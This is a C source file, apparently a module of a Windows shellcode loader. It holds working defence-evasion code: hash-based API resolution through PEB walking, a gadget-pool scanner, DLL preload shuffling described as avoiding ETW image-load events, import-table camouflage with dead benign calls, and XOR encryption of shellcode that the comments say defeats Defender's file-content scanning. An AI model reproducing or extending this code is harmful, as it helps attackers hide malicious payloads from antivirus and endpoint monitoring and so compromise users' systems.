// =============================================
// WinApi.c - CRT Replacements, API Hashing,
//            IAT Camouflage, Debug Logging
// =============================================

#include "Common.h"

// -----------------------------------------------
// Debug Logging (writes to debug.log)
// -----------------------------------------------
#ifdef DEBUG
static VOID WriteToLog(IN LPCSTR szMsg, IN DWORD dwLen) {
    // Build absolute path "<exedir>\debug.log" once; avoids CWD mismatch in elevated UAC processes.
    static CHAR szLogPath[MAX_PATH + 16] = {0};
    if (szLogPath[0] == '\0') {
        DWORD n = GetModuleFileNameA(NULL, szLogPath, MAX_PATH);
        if (n == 0) {
            szLogPath[0] = 'd'; szLogPath[1] = 'e'; szLogPath[2] = 'b';
            szLogPath[3] = 'u'; szLogPath[4] = 'g'; szLogPath[5] = '.';
            szLogPath[6] = 'l'; szLogPath[7] = 'o'; szLogPath[8] = 'g';
            szLogPath[9] = '\0';
        } else {
            INT i;
            for (i = (INT)n - 1; i >= 0; i--) {
                if (szLogPath[i] == '\\') {
                    szLogPath[i+1]  = 'd'; szLogPath[i+2]  = 'e'; szLogPath[i+3]  = 'b';
                    szLogPath[i+4]  = 'u'; szLogPath[i+5]  = 'g'; szLogPath[i+6]  = '.';
                    szLogPath[i+7]  = 'l'; szLogPath[i+8]  = 'o'; szLogPath[i+9]  = 'g';
                    szLogPath[i+10] = '\0';
                    break;
                }
            }
        }
    }
    HANDLE hFile = CreateFileA(szLogPath, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD dwWritten = 0;
        WriteFile(hFile, szMsg, dwLen, &dwWritten, NULL);
        CloseHandle(hFile);
    }
}

VOID DbgLog(IN LPCSTR msg) {
    DWORD len = (DWORD)StrLenA(msg);
    WriteToLog(msg, len);
    WriteToLog("\r\n", 2);
}

VOID DbgLogStatus(IN LPCSTR msg, IN NTSTATUS status) {
    // Write msg + hex status
    DWORD len = (DWORD)StrLenA(msg);
    WriteToLog(msg, len);

    // Convert NTSTATUS to hex string
    char hex[20] = " NTSTATUS=0x";
    char* p = hex + 12;
    for (int i = 7; i >= 0; i--) {
        int nibble = (status >> (i * 4)) & 0xF;
        *p++ = (nibble < 10) ? ('0' + nibble) : ('A' + nibble - 10);
    }
    *p = 0;
    WriteToLog(hex, (DWORD)(p - hex));
    WriteToLog("\r\n", 2);
}

// Write label + DWORD value as "0x" + 8 hex digits, then newline.
// Use for GetLastError() / HRESULT / status codes.
VOID DbgLogHex(IN LPCSTR label, IN DWORD value) {
    DWORD len = (DWORD)StrLenA(label);
    WriteToLog(label, len);
    char hex[12] = "0x";
    char* p = hex + 2;
    for (int i = 7; i >= 0; i--) {
        int nibble = (value >> (i * 4)) & 0xF;
        *p++ = (nibble < 10) ? ('0' + nibble) : ('A' + nibble - 10);
    }
    WriteToLog(hex, (DWORD)(p - hex));
    WriteToLog("\r\n", 2);
}

// Write label + string value, then newline.
// Use for URLs, hostnames, paths, etc.
VOID DbgLogStr(IN LPCSTR label, IN LPCSTR value) {
    DWORD len = (DWORD)StrLenA(label);
    WriteToLog(label, len);
    if (value) WriteToLog(value, (DWORD)StrLenA(value));
    WriteToLog("\r\n", 2);
}
#endif

// -----------------------------------------------
// CRT stubs required when /GL is disabled
// Compiler generates implicit calls for = {0} etc.
// -----------------------------------------------
#pragma function(memset)
void* memset(void* dest, int val, size_t count) {
    __stosb((unsigned char*)dest, (unsigned char)val, count);
    return dest;
}

#pragma function(memcpy)
void* memcpy(void* dest, const void* src, size_t count) {
    __movsb((unsigned char*)dest, (const unsigned char*)src, count);
    return dest;
}

// -----------------------------------------------
// Jenkins One-at-a-Time 32-bit Hash (ANSI)
// -----------------------------------------------
UINT32 HashStringJenkinsOneAtATime32BitA(IN PCHAR String) {
    SIZE_T  i       = 0;
    UINT32  Hash    = 0;

    while (String[i] != 0) {
        Hash += String[i++];
        Hash += Hash << 10;
        Hash ^= Hash >> 6;
    }

    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;

    return Hash;
}

// -----------------------------------------------
// Jenkins One-at-a-Time 32-bit Hash (Wide)
// -----------------------------------------------
UINT32 HashStringJenkinsOneAtATime32BitW(IN PWCHAR String) {
    SIZE_T  i       = 0;
    UINT32  Hash    = 0;

    while (String[i] != 0) {
        Hash += String[i++];
        Hash += Hash << 10;
        Hash ^= Hash >> 6;
    }

    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;

    return Hash;
}

// -----------------------------------------------
// CRT-free string functions
// -----------------------------------------------
SIZE_T StrLenA(IN LPCSTR String) {
    LPCSTR s = String;
    while (*s) s++;
    return (SIZE_T)(s - String);
}

SIZE_T StrLenW(IN LPCWSTR String) {
    LPCWSTR s = String;
    while (*s) s++;
    return (SIZE_T)(s - String);
}

INT StrCmpA(IN LPCSTR Str1, IN LPCSTR Str2) {
    while (*Str1 && (*Str1 == *Str2)) {
        Str1++;
        Str2++;
    }
    return *(const unsigned char*)Str1 - *(const unsigned char*)Str2;
}

// -----------------------------------------------
// In-place XOR over pBuf with cycling fixed-length key.
// Used by Phantom/Ghost placement: encrypt shellcode bytes
// before writing them to a transacted / delete-on-close
// file, then decrypt in memory after section mapping. The
// file-write step is what Defender's MpFilter content-
// inspects; encrypted bytes there produce no signature hit.
// -----------------------------------------------
VOID XorBufferInPlace(IN OUT PBYTE pBuf, IN DWORD dwSize, IN PBYTE pKey, IN DWORD dwKeyLen) {
    if (!pBuf || !pKey || dwKeyLen == 0) return;
    for (DWORD i = 0; i < dwSize; i++)
        pBuf[i] ^= pKey[i % dwKeyLen];
}

// -----------------------------------------------
// Walk PEB to find a loaded module by its upper-case
// BaseDllName (e.g. L"NTDLL.DLL"). Case-insensitive:
// compares name byte-by-byte after uppercasing.
// Used when hash-based lookup isn't reliable due to
// per-system casing differences.
// -----------------------------------------------
PVOID FindLoadedModuleW(IN PCWSTR szUpperName) {

    PPEB2 pPeb = (PPEB2)__readgsqword(0x60);
    if (!pPeb || !pPeb->Ldr)
        return NULL;

    SIZE_T nameLen = 0;
    while (szUpperName[nameLen]) nameLen++;
    USHORT wantBytes = (USHORT)(nameLen * sizeof(WCHAR));

    PLIST_ENTRY pHead  = &pPeb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;

    while (pEntry != pHead) {
        PLDR_DT_TABLE_ENTRY pDte = (PLDR_DT_TABLE_ENTRY)pEntry;

        if (pDte->BaseDllName.Buffer && pDte->BaseDllName.Length == wantBytes) {
            SIZE_T j;
            for (j = 0; j < nameLen; j++) {
                WCHAR c = pDte->BaseDllName.Buffer[j];
                if (c >= L'a' && c <= L'z') c -= 32;
                if (c != szUpperName[j]) break;
            }
            if (j == nameLen)
                return pDte->DllBase;
        }

        pEntry = pEntry->Flink;
    }

    return NULL;
}

// -----------------------------------------------
// Fetch module base by walking PEB (hash-based)
// -----------------------------------------------
PVOID FetchModuleBaseAddr(IN UINT32 dwModuleNameHash) {

    PPEB2 pPeb = (PPEB2)__readgsqword(0x60);
    if (!pPeb || !pPeb->Ldr)
        return NULL;

    PLIST_ENTRY pHead  = &pPeb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;

    while (pEntry != pHead) {
        PLDR_DT_TABLE_ENTRY pDte = (PLDR_DT_TABLE_ENTRY)pEntry;

        if (pDte->BaseDllName.Buffer != NULL) {
            if (HashStringJenkinsOneAtATime32BitW(pDte->BaseDllName.Buffer) == dwModuleNameHash) {
                return pDte->DllBase;
            }
        }

        pEntry = pEntry->Flink;
    }

    return NULL;
}

// -----------------------------------------------
// Validate DOS + NT signatures on a loaded module
// base. Returns TRUE + *ppNt on success.
// -----------------------------------------------
BOOL ValidatePeHeaders(IN PVOID pModuleBase, OUT PIMAGE_NT_HEADERS* ppNt) {

    if (!pModuleBase || !ppNt)
        return FALSE;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    *ppNt = pNt;
    return TRUE;
}

// -----------------------------------------------
// Validate DOS + NT signatures on a PE buffer read
// off disk. Additionally verifies the NT header fits
// within sBufSize, since the buffer may be a partial
// read (e.g. 1024-byte PE-header sniff).
// -----------------------------------------------
BOOL ValidatePeHeadersBounded(IN PVOID pBuffer, IN SIZE_T sBufSize, OUT PIMAGE_NT_HEADERS* ppNt) {

    if (!pBuffer || !ppNt || sBufSize < sizeof(IMAGE_DOS_HEADER))
        return FALSE;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBuffer;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pBuffer + pDos->e_lfanew);
    if ((PBYTE)pNt + sizeof(IMAGE_NT_HEADERS) > (PBYTE)pBuffer + sBufSize)
        return FALSE;
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    *ppNt = pNt;
    return TRUE;
}

// -----------------------------------------------
// Scan pModule's executable sections for byte pattern
// pPattern (dwPatternLen bytes) and append every hit
// to pPool until GADGET_POOL_CAPACITY is reached.
// -----------------------------------------------
VOID GadgetPoolScanModule(IN OUT PGADGET_POOL pPool, IN PVOID pModule, IN const BYTE* pPattern, IN DWORD dwPatternLen) {

    if (!pPool || !pModule || !pPattern || dwPatternLen == 0)
        return;

    PIMAGE_NT_HEADERS pNt = NULL;
    if (!ValidatePeHeaders(pModule, &pNt))
        return;

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD s = 0; s < pNt->FileHeader.NumberOfSections && pPool->dwCount < GADGET_POOL_CAPACITY; s++) {
        if (!(pSec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE))
            continue;

        PBYTE pStart = (PBYTE)pModule + pSec[s].VirtualAddress;
        DWORD dwSize = pSec[s].Misc.VirtualSize;

        for (DWORD j = 0; j + dwPatternLen <= dwSize && pPool->dwCount < GADGET_POOL_CAPACITY; j++) {
            BOOL bMatch = TRUE;
            for (DWORD k = 0; k < dwPatternLen; k++) {
                if (pStart[j + k] != pPattern[k]) { bMatch = FALSE; break; }
            }
            if (bMatch)
                pPool->pGadgets[pPool->dwCount++] = (PVOID)(pStart + j);
        }
    }
}

PVOID GadgetPoolRandom(IN const PGADGET_POOL pPool) {

    if (!pPool || pPool->dwCount == 0)
        return NULL;
    DWORD idx = (DWORD)(__rdtsc() % pPool->dwCount);
    return pPool->pGadgets[idx];
}

// -----------------------------------------------
// Fetch export address from a module (hash-based)
// -----------------------------------------------
PVOID FetchExportAddress(IN PVOID pModuleBase, IN UINT32 dwApiNameHash) {

    PIMAGE_NT_HEADERS pNt = NULL;
    if (!ValidatePeHeaders(pModuleBase, &pNt))
        return NULL;

    if (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size == 0)
        return NULL;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)pModuleBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    PDWORD pdwNames     = (PDWORD)((PBYTE)pModuleBase + pExport->AddressOfNames);
    PDWORD pdwAddrs     = (PDWORD)((PBYTE)pModuleBase + pExport->AddressOfFunctions);
    PWORD  pwOrdinals   = (PWORD)((PBYTE)pModuleBase + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        PCHAR pcName = (PCHAR)((PBYTE)pModuleBase + pdwNames[i]);

        if (HashStringJenkinsOneAtATime32BitA(pcName) == dwApiNameHash) {
            PVOID pAddr = (PVOID)((PBYTE)pModuleBase + pdwAddrs[pwOrdinals[i]]);

            // Check for forwarded export
            ULONG_PTR uExportStart = (ULONG_PTR)pModuleBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            ULONG_PTR uExportEnd   = uExportStart + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

            if ((ULONG_PTR)pAddr >= uExportStart && (ULONG_PTR)pAddr < uExportEnd) {
                // Forwarded export - skip for now
                return NULL;
            }

            return pAddr;
        }
    }

    return NULL;
}

// -----------------------------------------------
// Initialize WinAPI function pointers via hashing
// Resolves from kernel32.dll
// -----------------------------------------------
BOOL InitializeWinApis(OUT PAPI_HASHING pApi) {

    PVOID pKernel32 = FindLoadedModuleW(L"KERNEL32.DLL");
    if (!pKernel32)
        return FALSE;

    pApi->pLoadLibraryA     = (fnLoadLibraryA)FetchExportAddress(pKernel32, LoadLibraryA_JOAAT);
    pApi->pGetProcAddress   = (fnGetProcAddress)FetchExportAddress(pKernel32, GetProcAddress_JOAAT);
    pApi->pGetModuleHandleA = (fnGetModuleHandleA)FetchExportAddress(pKernel32, GetModuleHandleA_JOAAT);
    pApi->pVirtualProtect   = (fnVirtualProtect)FetchExportAddress(pKernel32, VirtualProtect_JOAAT);

    if (!pApi->pLoadLibraryA || !pApi->pGetProcAddress || !pApi->pGetModuleHandleA || !pApi->pVirtualProtect)
        return FALSE;

    return TRUE;
}

// -----------------------------------------------
// Fisher-Yates shuffle the supplied DLL names, then
// LoadLibraryA each. All referenced DLLs end up in
// the loaded-module list but in a per-run-random order
// (RDTSC-seeded). Downstream modules still call
// LoadLibraryA but hit the loader cache → no second
// ETW image-load event. Run this AFTER
// BlindDllNotifications so user-mode callbacks are
// already severed; kernel ETW sees the shuffled order.
// -----------------------------------------------
VOID ShufflePreloadLibraries(IN PAPI_HASHING pApi, IN LPCSTR* pNames, IN DWORD dwCount) {

    if (!pApi || !pApi->pLoadLibraryA || !pNames || dwCount == 0)
        return;

    // Local index permutation (cap keeps stack bounded; callers use ≤8)
    DWORD idx[16];
    if (dwCount > 16)
        dwCount = 16;
    for (DWORD i = 0; i < dwCount; i++)
        idx[i] = i;

    // Fisher-Yates using RDTSC as the entropy source
    for (DWORD i = dwCount - 1; i > 0; i--) {
        DWORD j = (DWORD)(__rdtsc() % (i + 1));
        DWORD t = idx[i]; idx[i] = idx[j]; idx[j] = t;
    }

    for (DWORD i = 0; i < dwCount; i++)
        pApi->pLoadLibraryA(pNames[idx[i]]);
}

// -----------------------------------------------
// IAT Camouflage
// Import benign WinAPIs to pad the IAT
// Uses compile-time seed trick to prevent
// dead-code elimination by the optimizer
// -----------------------------------------------
static int RandomCompileTimeSeed(void) {
    return '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
}

static PVOID IatHelper(PVOID* ppAddress) {
    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
    if (!pAddress)
        return NULL;

    *(int*)pAddress = RandomCompileTimeSeed() % 0xFF;
    *ppAddress = pAddress;
    return pAddress;
}

VOID IatCamouflage(VOID) {
    PVOID   pAddress = NULL;
    int*    A = (int*)IatHelper(&pAddress);

    if (!A)
        return;

    // Impossible condition: RandomCompileTimeSeed() % 0xFF is always < 255, so *A < 255 < 350
    if (*A > 350) {
        unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
        i = GetLastError();
        i = SetCriticalSectionSpinCount(NULL, NULL);
        i = GetWindowContextHelpId(NULL);
        i = GetWindowLongPtrW(NULL, NULL);
        i = RegisterClassW(NULL);
        i = IsWindowVisible(NULL);
        i = ConvertDefaultLocale(NULL);
        i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
        i = IsDialogMessageW(NULL, NULL);
    }

    HeapFree(GetProcessHeap(), 0, pAddress);
}
